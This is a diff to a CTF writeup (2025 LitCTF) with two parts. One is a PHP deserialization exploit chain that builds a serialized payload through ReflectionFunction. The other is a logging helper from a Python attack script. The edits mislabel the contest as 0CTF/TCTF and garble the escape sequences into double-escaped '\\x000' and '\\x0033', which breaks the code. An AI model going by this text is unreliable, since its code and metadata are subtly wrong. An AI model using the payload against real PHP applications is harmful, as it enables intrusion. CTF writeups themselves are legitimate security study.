@@ -70,6 +70,9 @@ prerequisites:
 - Thymeleaf/SSTI 模板注入绕过
 - PHP 反序列化绕过正则黑名单
 - NestJS 弱密码爆破（hydra/patator）
+contest_normalized: "0CTF/TCTF"
+contest_year: 2025
+subcategory_guess: "ssti"
 ---
 # 2025 LitCTF writeup by Mini-Venom
 
@@ -256,13 +259,13 @@ $a=new Taki();
 $a->musubi=new Mitsuha();
 $a->musubi->memory=new KatawareDoki();
 $a->musubi->memory->kuchikamizake="ReflectionFunction";
-$a->musubi->memory->name=" 0lambda_50";
+$a->musubi->memory->name="\\x000lambda_50";
 $a->musubi->memory->soul=new Taki();
 $a->musubi->memory->soul->musubi='time';
 $a->musubi->memory->soul->magic="invoke";
 $aa=new Arrayobject($a);
 $payload=serialize($aa);
-$payload=str_replace(" 0","%00",$payload);
+$payload=str_replace("\\x000","%00",$payload);
 echo $payload;
 
 image-20250525171106360
@@ -476,13 +479,13 @@ ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
 def log_info(message, status=None):
     color_codes = {
-        'success': ' 33[92m',
-        'error': ' 33[91m',
-        'warning': ' 33[93m',
-        None: ' 33[95m'
+        'success': '\\x0033[92m',
+        'error': '\\x0033[91m',
+        'warning': '\\x0033[93m',
+        None: '\\x0033[95m'
     }
-    color = color_codes.get(status, ' 33[95m')
-    print(f"{color}[*] {message} 33[0m")
+    color = color_codes.get(status, '\\x0033[95m')
+    print(f"{color}[*] {message}\\x0033[0m")
 
 def get_random_delay():
     return random.uniform(0.1, 0.5)
@@ -1005,13 +1008,13 @@ $a=new Taki();
 $a->musubi=new Mitsuha();
 $a->musubi->memory=new KatawareDoki();
 $a->musubi->memory->kuchikamizake="ReflectionFunction";
-$a->musubi->memory->name=" 0lambda_50";
+$a->musubi->memory->name="\\x000lambda_50";
 $a->musubi->memory->soul=new Taki();
 $a->musubi->memory->soul->musubi='time';
 $a->musubi->memory->soul->magic="invoke";
 $aa=new Arrayobject($a);
 $payload=serialize($aa);
-$payload=str_replace(" 0","%00",$payload);
+$payload=str_replace("\\x000","%00",$payload);
 echo $payload;
 const loginBtn = document.getElementById('loginBtn');
         const passwordInput = document.getElementById('password');
@@ -1181,13 +1184,13 @@ ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')
 
 def log_info(message, status=None):
     color_codes = {
-        'success': ' 33[92m',
-        'error': ' 33[91m',
-        'warning': ' 33[93m',
-        None: ' 33[95m'
+        'success': '\\x0033[92m',
+        'error': '\\x0033[91m',
+        'warning': '\\x0033[93m',
+        None: '\\x0033[95m'
     }
-    color = color_codes.get(status, ' 33[95m')
-    print(f"{color}[*] {message} 33[0m")
+    color = color_codes.get(status, '\\x0033[95m')
+    print(f"{color}[*] {message}\\x0033[0m")
 
 def get_random_delay():
     return random.uniform(0.1, 0.5)
